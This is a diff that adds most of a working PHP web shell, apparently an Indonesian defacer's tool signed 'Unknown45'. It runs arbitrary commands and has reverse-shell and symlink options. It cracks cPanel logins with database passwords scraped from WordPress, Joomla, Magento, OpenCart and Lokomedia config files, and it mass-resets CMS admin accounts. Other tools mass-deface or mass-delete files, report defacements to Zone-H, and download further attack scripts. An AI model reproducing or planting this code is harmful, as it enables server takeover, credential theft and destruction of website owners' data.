+				if(preg_match("/^rf (.*)$/", $_POST['cmd'], $match)) {
+					tools("readfile", $match[1]);
+				}
+				elseif(preg_match("/^spawn (.*)$/", $_POST['cmd'], $match)) {
+					tools("spawn", $match[1]);
+				}
+				elseif(preg_match("/^symlink$/", $_POST['cmd'], $match)) {
+					tools("symlink");
+				}
+				elseif(preg_match("/^rvr (.*)$/", $_POST['cmd'], $match)) {
+					tools("network", $match[1]);
+				}
+				elseif(preg_match("/^krdp$/", $_POST['cmd'])) {
+					tools("krdp");
+				}
+				elseif(preg_match("/^jumping$/", $_POST['cmd'])) {
+					tools("jumping");
+				}
+				elseif(preg_match("/^idxconfig$/", $_POST['cmd'])) {
+					tools("idxconfig");
+				}
+				elseif(preg_match("/^logout$/", $_POST['cmd'])) {
+					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+					print "<script>window.location='?';</script>";
+				}
+				elseif(preg_match("/^killme$/", $_POST['cmd'])) {
+					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+					@unlink(__FILE__);
+					print "<script>window.location='?';</script>";
+				}
+				else {
+					print "<pre>".exe($_POST['cmd'])."</pre>";
+				}
+			}
+			else {
+				files_and_folder();
+			}
+		}
+		elseif($_GET['do'] === "zoneh") {
+			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
+				$nick 	= $_POST['nick'];
+				$domain = explode("\r\n", $_POST['url']);
+
+				print "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
+				print "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
+	
+				foreach($domain as $no => $url) {
+					$no   = ($no+1).".";
+					$post = curl("http://www.zone-h.org/notify/single", TRUE, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
+					if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $post)) {
+						print "$no $url -> ".color(1, 2, "OK")."<br>";
+					} else {
+						print "$no $url -> ".color(1, 1, "ERROR")."<br>";
+					}
+				}
+			}
+			else {
+				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
+		    	       Defacer: <br>
+		    	       <input type='text' name='nick' size='50' value='Unknown45'><br><br>
+		    	       Domains: <br>
+		    	       <textarea style='width: 450px; height: 150px;' name='url' placeholder='http://google.com/'></textarea><br>
+		    	       <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='submit' value='Submit'>
+		    	       </form></center>";
+		   	}
+		}
+		elseif($_GET['do'] == 'cpanel') {
+			if($_POST['crack']) {
+				$usercp = explode("\r\n", $_POST['user_cp']);
+				$passcp = explode("\r\n", $_POST['pass_cp']);
+				$i = 0;
+				foreach($usercp as $ucp) {
+					foreach($passcp as $pcp) {
+						$connect = mysql_connect('localhost', $ucp, $pcp);
+						if($connect) {
+							if($_SESSION[$ucp] && $_SESSION[$pcp]) {
+							} else {
+								$_SESSION[$ucp] = "1";
+								$_SESSION[$pcp] = "1";
+								if($ucp === '' || $pcp === '') {
+									// 
+								} else {
+									$i++;
+									print "username (".color(1, 2, $ucp).") password (".color(1, 2, $pcp).") domain (";
+									if(!function_exists('posix_getpwuid')) print color(1, 1, "Function is Disable by System!");
+									if(!getdomainname()) print color(1, 1, "Can't get domain name");
+									foreach(getdomainname() as $domain) {
+										$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
+										$userdomain = $userdomain->name;
+										if($userdomain === $user) {
+											print "<a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
+											break;
+										}
+									}
+									print (empty($domain)) ? color(1, 1, "Can't get domain name.") : color(1, 2, $domain);
+									print ")<br>";
+								}
+							}
+							mysql_close($connect);
+						}
+					}
+				}
+				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses Crack $i Cpanel")."</p>";
+			} else {
+				print "<center>
+					   <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
+					   <form method='post'>
+					   USER: <br>
+					   <textarea style='width: 450px; height: 150px;' name='user_cp'>";
+				print implode("\n", getuser());
+				print "</textarea><br>
+					   PASS: <br>
+					   <span>Grab Password from Link Config:</span><br>
+					   <input style='width: 425px; background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='text' name='linkpass' placeholder='http://web.com/idx_config/'>
+					   <input style='background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='submit' name='submitlink' value='>>'>
+					   <br>
+					   <textarea style='width: 450px; height: 200px;' name='pass_cp'>";
+
+				if(isset($_POST['submitlink'])) {
+					$getpass = $_POST['linkpass'];
+					$get = curl($_POST['linkpass']);
+					preg_match_all('/<a href="(.*?).txt">/', $get, $link);
+					foreach($link[1] as $link_config) {
+						$scandir[] = "$link_config.txt";
+					}
+				}
+				else {
+					$getpass = path();
+					$scandir = scandir($getpass);
+				}
+
+				$password = "";
+
+				foreach($scandir as $files) {
+					$file = "$getpass/$files";
+					$config = file_get_contents($file);
+					if(preg_match("/WordPress/", $config)) {
+						$password .= getValue($config, "DB_PASSWORD', '", "'")."\n";
+					} 
+					elseif(preg_match("/JConfig|joomla/", $config)) {
+						$password .= getValue($config, "password = '", "'")."\n";
+					} 
+					elseif(preg_match("/Magento|Mage_Core/", $config)) {
+						$password .= getValue($config, "<password><![CDATA[", "]]></password>")."\n";
+					} 
+					elseif(preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
+						$password .= getValue($config, 'password = "', '"')."\n";
+					} 
+					elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
+						$password .= getValue($config, "'DB_PASSWORD', '", "'")."\n";
+					} 
+					elseif(preg_match("/^[client]$/", $config)) {
+						preg_match("/password=(.*?)/", $config, $pass);
+						if(preg_match('/"/', $pass[1])) {
+							$pass[1] = str_replace('"', "", $pass[1]);
+							$password .= $pass[1]."\n";
+						} 
+						else {
+							$password .= $pass[1]."\n";
+						}
+					} 
+					elseif(preg_match("/cc_encryption_hash/", $config)) {
+						$password .= getValue($config, "db_password = '", "'")."\n";
+					}
+				}
+
+				print $password;
+
+				print "</textarea><br>
+					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='crack' value='Crack'>
+					   </form></center>";
+			}
+		}
+		elseif($_GET['do'] == 'mpc') {
+			if($_POST['hajar']) {
+				if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
+					print "username atau password harus lebih dari 6 karakter";
+				} 
+				else {
+					$user_baru = $_POST['user_baru'];
+					$pass_baru = md5($_POST['pass_baru']);
+					$conf = $_POST['config_dir'];
+
+					if(preg_match("/^http:\/\//", $conf) OR preg_match("/^https:\/\//", $conf)) {
+						$get = curl($conf);
+						preg_match_all('/<a href="(.*?).txt">/', $get, $link);
+						foreach($link[1] as $link_config) {
+							$scan_conf[] = "$link_config.txt";
+						}
+					}
+					else {
+						$scan_conf = scandir($conf);
+					}
+
+					foreach($scan_conf as $file_conf) {
+						$config = file_get_contents("$conf/$file_conf");
+						if(preg_match("/JConfig|joomla/",$config)) {
+							$dbhost = getValue($config,"host = '","'");
+							$dbuser = getValue($config,"user = '","'");
+							$dbpass = getValue($config,"password = '","'");
+							$dbname = getValue($config,"db = '","'");
+							$dbprefix = getValue($config,"dbprefix = '","'");
+							$prefix = $dbprefix."users";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+							$result = mysql_fetch_array($q);
+							$id = $result['id'];
+							$site = getValue($config,"sitename = '","'");
+							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => Joomla<br>";
+							if($site == '') {
+								print "Sitename => ".color(1, 1, "Can't get domain name")."<br>";
+							} 
+							else {
+								print "Sitename => $site<br>";
+							}
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						} elseif(preg_match("/WordPress/",$config)) {
+							$dbhost = getValue($config,"DB_HOST', '","'");
+							$dbuser = getValue($config,"DB_USER', '","'");
+							$dbpass = getValue($config,"DB_PASSWORD', '","'");
+							$dbname = getValue($config,"DB_NAME', '","'");
+							$dbprefix = getValue($config,"table_prefix  = '","'");
+							$prefix = $dbprefix."users";
+							$option = $dbprefix."options";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
+							$result = mysql_fetch_array($q);
+							$id = $result[ID];
+							$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
+							$result2 = mysql_fetch_array($q2);
+							$target = $result2[option_value];
+							if($target == '') {
+								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+							} 
+							else {
+								$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
+							}
+							$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => Wordpress<br>";
+							print $url_target;
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						} 
+						elseif(preg_match("/Magento|Mage_Core/",$config)) {
+							$dbhost = getValue($config,"<host><![CDATA[","]]></host>");
+							$dbuser = getValue($config,"<username><![CDATA[","]]></username>");
+							$dbpass = getValue($config,"<password><![CDATA[","]]></password>");
+							$dbname = getValue($config,"<dbname><![CDATA[","]]></dbname>");
+							$dbprefix = getValue($config,"<table_prefix><![CDATA[","]]></table_prefix>");
+							$prefix = $dbprefix."admin_user";
+							$option = $dbprefix."core_config_data";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+							$result = mysql_fetch_array($q);
+							$id = $result[user_id];
+							$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
+							$result2 = mysql_fetch_array($q2);
+							$target = $result2[value];
+							if($target == '') {
+								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+							} 
+							else {
+								$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
+							}
+							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => Magento<br>";
+							print $url_target;
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
+							$dbhost = getValue($config,"'DB_HOSTNAME', '","'");
+							$dbuser = getValue($config,"'DB_USERNAME', '","'");
+							$dbpass = getValue($config,"'DB_PASSWORD', '","'");
+							$dbname = getValue($config,"'DB_DATABASE', '","'");
+							$dbprefix = getValue($config,"'DB_PREFIX', '","'");
+							$prefix = $dbprefix."user";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
+							$result = mysql_fetch_array($q);
+							$id = $result[user_id];
+							$target = getValue($config,"HTTP_SERVER', '","'");
+							if($target == '') {
+								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+							} 
+							else {
+								$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
+							}
+							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => OpenCart<br>";
+							print $url_target;
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						} 
+						elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
+							$dbhost = getValue($config,'server = "','"');
+							$dbuser = getValue($config,'username = "','"');
+							$dbpass = getValue($config,'password = "','"');
+							$dbname = getValue($config,'database = "','"');
+							$prefix = "users";
+							$option = "identitas";
+							$conn = mysql_connect($dbhost,$dbuser,$dbpass);
+							$db = mysql_select_db($dbname);
+							$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
+							$result = mysql_fetch_array($q);
+							$target = $result[alamat_website];
+							if($target == '') {
+								$target2 = $result[url];
+								$url_target = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+								if($target2 == '') {
+									$url_target2 = "Login => ".color(1, 1, "Cant't get domain name")."<br>";
+								} 
+								else {
+									$cek_login3 = file_get_contents("$target2/adminweb/");
+									$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
+									if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
+										$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
+									} 
+									elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
+										$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
+									} 
+									else {
+										$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+									}
+								}
+							} else {
+								$cek_login = file_get_contents("$target/adminweb/");
+								$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
+								if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
+									$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
+								} 
+								elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
+									$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
+								} 
+								else {
+									$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
+								}
+							}
+							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
+							print "Config => ".$file_conf."<br>";
+							print "CMS => Lokomedia<br>";
+							if(preg_match("/Can't get domain name/", $url_target)) {
+								print $url_target2;
+							} 
+							else {
+								print $url_target;
+							}
+							if(!$update OR !$conn OR !$db) {
+								print "Status => ".color(1, 1, mysql_error())."<br><br>";
+							} 
+							else {
+								print "Status => ".color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";
+							}
+							mysql_close($conn);
+						}
+					}
+				}
+			} 
+			else {
+				print "<center>
+				<h1>Mass Password Change</h1>
+				<form method='post'>
+				<input type='radio' name='config_type' value='dir' checked>DIR Config<input type='radio' name='config_type' value='link'>LINK Config<br>
+				<input type='text' size='50' name='config_dir' value='".path()."'><br><br>
+				Set User & Pass: <br>
+				<input type='text' name='user_baru' value='mabang' placeholder='user_baru'><br>
+				<input type='text' name='pass_baru' value='mabang' placeholder='pass_baru'><br>
+				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
+				</form></center>";
+			}
+		}
+		elseif($_GET['do'] === "mass") {
+			if($_POST['start']) {
+				if($_POST['mass_type'] === 'singledir') {
+					print "<div style='margin: 5px auto; padding: 5px'>";
+					massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file']);
+					print "</div>";
+				} 
+				elseif($_POST['mass_type'] === 'alldir') {
+					print "<div style='margin: 5px auto; padding: 5px'>";
+					massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file'], "-alldir");
+					print "</div>";
+				}
+				elseif($_POST['mass_type'] === "delete") {
+					print "<div style='margin: 5px auto; padding: 5px'>";
+					massdelete($_POST['d_dir'], $_POST['d_file']);
+					print "</div>";
+				}
+			} 
+			else {
+				print "<center><form method='post'>
+					   <font style='text-decoration: underline;'>Tipe Mass:</font><br>
+					   <input type='radio' name='mass_type' value='singledir' checked>Mass Deface Single Directory<input type='radio' name='mass_type' value='alldir'>Mass Deface All Directory<input type='radio' name='mass_type' value='delete'>Mass Delete File<br>
+					   <span>( kosongkan 'Index File' jika memilih Mass Delete File )</span><br><br>
+					   <font style='text-decoration: underline;'>Folder:</font><br>
+					   <input type='text' name='d_dir' value='".path()."' style='width: 450px;' height='10'><br><br>
+					   <font style='text-decoration: underline;'>Filename:</font><br>
+					   <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
+					   <font style='text-decoration: underline;'>Index File:</font><br>
+					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Unknown45</textarea><br>
+					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
+					   </form></center>";
+			}
+		}
+		elseif($_GET['do'] == 'fakeroot') {
+			ob_start();
+
+			$site = explode("\r\n", $_POST['url']);
+			$user = usergroup()->name;
+			$file = $_POST['file'];
+
+			if(!preg_match("#/home/$user/public_html#", $_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "failed :("));
+			
+			
+			if($_POST['reverse']) {
+				if(!is_writable($_SERVER['DOCUMENT_ROOT'])) die(color(1, 1, "Directory '".$_SERVER['DOCUMENT_ROOT']."' is not writeable."));
+				if(!is_writable(dirname($_SERVER['DOCUMENT_ROOT']))) die(color(1, 1, "Directory '".dirname($_SERVER['DOCUMENT_ROOT'])."' is not writeable."));
+
+				save($_SERVER['DOCUMENT_ROOT']."/".$file, "w", $_POST['script']);
+				save(dirname($_SERVER['DOCUMENT_ROOT'])."/".$file, "w", $_POST['script']);
+
+				foreach($site as $url) {
+					$cek = curl("$url/~$user/$file");
+					if(preg_match("/hacked/i", $cek)) {
+						print "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
+					}
+				}
+			} else {
+				print "<center><form method='post'>
+				Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
+				User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
+				Domain: <br>
+				<textarea style='width: 450px; height: 250px;' name='url'>";
+				print implode("\n", reverse());
+				print "</textarea><br>
+				<font style='text-decoration: underline;'>Index File:</font><br>
+				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Unknown45</textarea><br>
+				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='reverse' value='Scan Fake Root!'>
+				</form><br>
+				NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
+			}
+		}
+		elseif($_GET['do'] === 'lre') {
+			if(file_exists("makman.php")) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/makman.php' frameborder='0' scrolling='yes'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Makman'."));
+				if(getfile("LRE")) {
+					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/makman.php' frameborder='0' scrolling='yes'></iframe>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file makman.");
+					@unlink("makman.php");
+				}
+			}
+
+		}
+	}
+	elseif(isset($_GET['act'])) {
+		if($_GET['act'] === 'newfile') {
+			if($_POST['save']) {
+				$filename = htmlspecialchars($_POST['filename']);
+				$fopen    = fopen($filename, "a+");
+				if($fopen) {
+					$act = "<script>window.location='?act=edit&dir=".path()."&file=".$_POST['filename']."';</script>";
+				} 
+				else {
+					$act = color(1, 1, "Permission Denied!");
+				}
+			}
+			print $act;
+			print "<form method='post'>
+			Filename: <input type='text' name='filename' value='".path()."/asu.php' style='width: 450px;' height='10'>
+			<input type='submit' class='input' name='save' value='SUBMIT'>
+			</form>";
+		} 
+		elseif($_GET['act'] === 'newfolder') {
+			if($_POST['save']) {
+				$foldername = path().'/'.htmlspecialchars($_POST['foldername']);
+				if(!@mkdir($foldername)) {
+					$act = color(1, 1, "Permission Denied!");
+				} 
+				else {
+					$act = "<script>window.location='?dir=".path()."';</script>";
+				}
+			}
+			print $act;
+			print "<form method='post'>
+			Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
+			<input type='submit' class='input' name='save' value='SUBMIT'>
+			</form>";
+		} 
+		elseif($_GET['act'] === 'rename_folder') {
+			if($_POST['save']) {
+				$rename_folder = rename(path(), "".dirname(path()).DIRECTORY_SEPARATOR.htmlspecialchars($_POST['foldername']));
+				if($rename_folder) {
+					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
+				} 
+				else {
+					$act = color(1, 1, "Permission Denied!");
+				}
+			print "$act<br>";
+			}
+			print "<form method='post'>
+			<input type='text' value='".basename(path())."' name='foldername' style='width: 450px;' height='10'>
+			<input type='submit' class='input' name='save' value='RENAME'>
+			</form>";
+		} 
+		elseif($_GET['act'] === 'delete_folder') {
+			if(is_dir(path())) {
+				if(is_writable(path())) {
+					@rmdir(path());
+					if(!@rmdir(path()) AND OS() === "Linux") @exe("rm -rf ".path());
+					if(!@rmdir(path()) AND OS() === "Windows") @exe("rmdir /s /q ".path());
+					$act = "<script>window.location='?dir=".dirname(path())."';</script>";
+				} 
+				else {
+					$act = color(1, 1, "Could not remove directory '".basename(path())."'");
+				}
+			}
+			print $act;
+		} 
+		elseif($_GET['act'] === 'view') {
+			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
+		} 
+		elseif($_GET['act'] === 'edit') {
+			if($_POST['save']) {
+				$save = file_put_contents($_GET['file'], $_POST['src']);
+				if($save) {
+					$act = color(1, 2, "File Saved!");
+				} 
+				else {
+					$act = color(1, 1, "Permission Denied!");
+				}
+				print "$act<br>";
+			}
+
+			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "<form method='post'>
+			<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
+			<input type='submit' class='input' value='SAVE' name='save' style='width: 500px;'>
+			</form>";
+		} 
+		elseif($_GET['act'] === 'rename') {
+			if($_POST['save']) {
+				$rename = rename($_GET['file'], path().DIRECTORY_SEPARATOR.htmlspecialchars($_POST['filename']));
+				if($rename) {
+					$act = "<script>window.location='?dir=".path()."';</script>";
+				} 
+				else {
+					$act = color(1, 1, "Permission Denied!");
+				}
+				print "$act<br>";
+			}
+
+			print "Filename: ".color(1, 2, basename($_GET['file']))." [".writeable($_GET['file'], perms($_GET['file']))."]<br>";
+			print "[ <a href='?act=view&dir=".path()."&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=".path()."&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=".path()."&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=".path()."&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=".path()."&file=".$_GET['file']."'>delete</a> ]<br>";
+			print "<form method='post'>
+			<input type='text' value='".basename($_GET['file'])."' name='filename' style='width: 450px;' height='10'>
+			<input type='submit' class='input' name='save' value='RENAME'>
+			</form>";
+		}
+		elseif($_GET['act'] === 'delete') {
+			$delete = unlink($_GET['file']);
+			if($delete) {
+				$act = "<script>window.location='?dir=".path()."';</script>";
+			} 
+			else {
+				$act = color(1, 1, "Permission Denied!");
+			}
+			print $act;
+		}
+	}
+	else {
+		files_and_folder();
+	}
+}
+
+serverinfo();
+action();
+?>
+</body>
 </html>
+
